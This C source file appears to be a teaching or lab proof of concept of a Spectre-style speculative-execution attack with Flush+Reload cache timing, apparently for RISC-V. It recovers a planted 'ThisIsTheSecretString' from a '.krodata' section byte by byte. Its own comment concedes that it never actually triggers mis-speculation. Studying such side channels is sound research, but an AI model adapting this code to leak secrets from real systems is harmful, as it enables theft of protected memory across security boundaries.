#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define SECRET_LEN 21       // Length of the secret string
#define CACHE_THRESHOLD 50 // Cache hit time threshold in cycles

uint8_t padding1[64]; // Padding, potentially for cache alignment or separation
// Probe array for Flush+Reload cache side-channel attack
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

// Place the secret string in a custom section ".krodata"
__attribute__((section(".krodata")))
static const char secretStr[] = "ThisIsTheSecretString";

/**
 * @brief Victim function demonstrating a potential speculative execution vulnerability.
 * Accesses the probe array 'array2' based on a character from 'secretStr'.
 * @param idx Index into secretStr, potentially out-of-bounds during mis-speculation.
 */
void victimFunction(uint64_t idx) {
    uint8_t temp = 0; // Temporary variable, value likely unused

    // Speculative access boundary check
    // If 'idx' is out-of-bounds, this check might be bypassed speculatively.
    if (idx < SECRET_LEN) {
        // Access array2 based on the secret character value.
        // This caches the line corresponding to the secret character's value.
        temp = array2[secretStr[idx] * L1_BLOCK_SZ_BYTES];
    }

    // Read cycle counter, potentially to serialize or ensure speculative operations issue
    temp = rdcycle();
    (void)temp; // Prevent unused variable warning
}

int main(void) {
    uint64_t startTime, duration; // Timing variables
    uint8_t temp = 0;            // Dummy variable for cache read
    static uint64_t results[256]; // Cache hit counts per possible byte value

    printf("Starting secret byte extraction...\n");

    // Extract secret bytes one by one
    for(uint64_t i = 0; i < SECRET_LEN; ++i) {
        // Reset results array
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        // Flush the probe array from cache (Flush phase)
        flushCache((uint64_t)array2, sizeof(array2));

        // Call the victim function - potentially triggering speculative execution
        // Note: This simplified example doesn't explicitly trigger mis-speculation
        // for the bounds check, but demonstrates the core speculative access.
        victimFunction(i);

        // Measure access time for each entry in array2 (Reload phase)
        for (uint64_t m = 0; m < 256; ++m) {
            startTime = rdcycle();
            // Read from array2 entry - use '&=' to prevent optimization
            temp &= array2[m * L1_BLOCK_SZ_BYTES];
            duration = (rdcycle() - startTime);

            // Check if access time indicates a cache hit
            if (duration < CACHE_THRESHOLD) {
                results[m] += 1;
            }
        }

        // Find the byte value with the most cache hits
        uint64_t bestHit = 0;
        uint8_t bestGuess = 0;
        for (uint64_t m = 0; m < 256; ++m) {
            if (results[m] > bestHit) {
                bestHit = results[m];
                bestGuess = (uint8_t)m;
            }
        }

        // Print the guessed character for this position
        printf("\nSecret byte %lu: guessed '%c' (0x%02x) with %lu hits\n", i, bestGuess, bestGuess, bestHit);
    }

    printf("\nExtraction complete.\n");
    return 0;
}